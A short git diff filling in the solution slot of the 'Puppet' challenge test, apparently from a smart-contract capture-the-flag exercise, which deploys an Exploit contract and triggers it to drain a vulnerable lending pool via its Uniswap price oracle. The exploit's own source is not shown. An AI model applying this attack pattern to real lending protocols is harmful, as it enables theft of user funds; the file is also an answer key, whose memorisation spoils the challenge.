@@ -95,6 +95,16 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let exploit = await (await ethers.getContractFactory('contracts/puppet/Exploit.sol:Exploit')).deploy(
+            player.address,
+            token.address,
+            uniswapExchange.address,
+            lendingPool.address,
+            {value: PLAYER_INITIAL_ETH_BALANCE - (10n**18n)}
+        );
+
+        await token.connect(player).approve(exploit.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await exploit.exploit();
     });
 
     after(async function () {
